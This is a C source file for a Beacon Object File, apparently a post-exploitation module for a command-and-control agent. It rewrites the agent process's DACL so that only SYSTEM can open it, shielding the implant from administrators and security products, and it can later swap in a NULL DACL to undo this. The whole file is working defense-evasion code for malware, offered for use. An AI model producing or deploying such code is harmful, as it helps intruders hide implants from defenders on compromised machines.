/*
 * bof-aclprotect [protect|restore]
 *
 * Protect the current agent process from other users / security products by
 * replacing its kernel-object DACL with a single ACE that grants
 * BUILTIN\SYSTEM PROCESS_ALL_ACCESS.  No other principal (including the
 * logged-on administrator) can open the process afterwards.
 *
 * `restore` installs a NULL DACL, which grants full access to everyone and is
 * the easiest way to undo the protection from the same (or a SYSTEM) context.
 * The previous DACL SDDL is printed and saved to
 * %TEMP%\bof_aclprotect_<pid>.sddl before it is replaced.
 *
 * Note: once protected, the agent can still run BOFs in-process, but external
 * tools may no longer inject into or inspect it.  Use deliberately.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void show_dacl(HANDLE h, const char *label)
{
    PSECURITY_DESCRIPTOR sd = NULL;
    PACL dacl = NULL;
    LPSTR sddl = NULL;
    DWORD len = 0;

    if (ADVAPI32$GetSecurityInfo(h, SE_KERNEL_OBJECT,
            DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, &sd)
            != ERROR_SUCCESS)
        return;
    if (ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorA(
            sd, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &sddl, &len)
            && sddl) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s DACL: %s\n", label, sddl);
        KERNEL32$LocalFree(sddl);
    }
    if (sd) KERNEL32$LocalFree(sd);
}

static void save_sddl(HANDLE h, DWORD pid)
{
    PSECURITY_DESCRIPTOR sd = NULL;
    PACL dacl = NULL;
    LPSTR sddl = NULL;
    DWORD len = 0;
    char path[MAX_PATH], tmp[MAX_PATH];
    HANDLE f;

    if (ADVAPI32$GetSecurityInfo(h, SE_KERNEL_OBJECT,
            DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, &sd)
            != ERROR_SUCCESS)
        return;
    if (!ADVAPI32$ConvertSecurityDescriptorToStringSecurityDescriptorA(
            sd, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, &sddl, &len) ||
        !sddl) {
        if (sd) KERNEL32$LocalFree(sd);
        return;
    }
    if (KERNEL32$GetTempPathA(sizeof(tmp), tmp)) {
        bof_snprintf(path, sizeof(path), "%sbof_aclprotect_%lu.sddl",
                     tmp, (unsigned long)pid);
        f = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                 FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            DWORD wrote = 0;
            KERNEL32$WriteFile(f, sddl, (DWORD)bof_strlen(sddl), &wrote, NULL);
            KERNEL32$CloseHandle(f);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] saved previous DACL: %s\n", path);
        }
    }
    KERNEL32$LocalFree(sddl);
    if (sd) KERNEL32$LocalFree(sd);
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "protect";
    int mlen = 0;
    HANDLE self = KERNEL32$GetCurrentProcess();
    DWORD pid = KERNEL32$GetCurrentProcessId();
    unsigned char sidbuf[SECURITY_MAX_SID_SIZE];
    DWORD sidlen = sizeof(sidbuf);
    unsigned char aclbuf[256];
    SECURITY_DESCRIPTOR sd;
    DWORD rc;
    int restore;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (!mode || !mode[0]) mode = "protect";
    restore = bof_stricmp(mode, "restore") == 0 ||
              bof_stricmp(mode, "undo") == 0;

    show_dacl(self, "current");

    if (restore) {
        if (!ADVAPI32$InitializeSecurityDescriptor(&sd,
                                                   SECURITY_DESCRIPTOR_REVISION)) {
            BeaconPrintf(CALLBACK_ERROR, "InitializeSecurityDescriptor failed\n");
            return;
        }
        if (!ADVAPI32$SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "SetSecurityDescriptorDacl failed\n");
            return;
        }
        rc = ADVAPI32$SetSecurityInfo(self, SE_KERNEL_OBJECT,
                DACL_SECURITY_INFORMATION | UNPROTECTED_DACL_SECURITY_INFORMATION,
                NULL, NULL, NULL, NULL);
        if (rc == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] pid %lu ACL restored to a NULL DACL (full access)\n",
                         (unsigned long)pid);
            show_dacl(self, "new");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "SetSecurityInfo failed: %lu\n",
                         (unsigned long)rc);
        }
        return;
    }

    save_sddl(self, pid);

    if (!ADVAPI32$CreateWellKnownSid(WinLocalSystemSid, NULL, sidbuf, &sidlen)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateWellKnownSid(SYSTEM) failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }
    if (!ADVAPI32$InitializeAcl((PACL)aclbuf, sizeof(aclbuf), ACL_REVISION)) {
        BeaconPrintf(CALLBACK_ERROR, "InitializeAcl failed\n");
        return;
    }
    if (!ADVAPI32$AddAccessAllowedAceEx((PACL)aclbuf, ACL_REVISION, 0,
                                        PROCESS_ALL_ACCESS, (PSID)sidbuf)) {
        BeaconPrintf(CALLBACK_ERROR, "AddAccessAllowedAceEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }
    if (!ADVAPI32$InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
        BeaconPrintf(CALLBACK_ERROR, "InitializeSecurityDescriptor failed\n");
        return;
    }
    if (!ADVAPI32$SetSecurityDescriptorDacl(&sd, TRUE, (PACL)aclbuf, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "SetSecurityDescriptorDacl failed\n");
        return;
    }

    rc = ADVAPI32$SetSecurityInfo(self, SE_KERNEL_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            NULL, NULL, (PACL)aclbuf, NULL);
    if (rc == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] pid %lu protected: only SYSTEM has PROCESS_ALL_ACCESS\n",
                     (unsigned long)pid);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] restore from SYSTEM with: bof-aclprotect restore\n");
        show_dacl(self, "new");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "SetSecurityInfo failed: %lu\n",
                     (unsigned long)rc);
    }
}
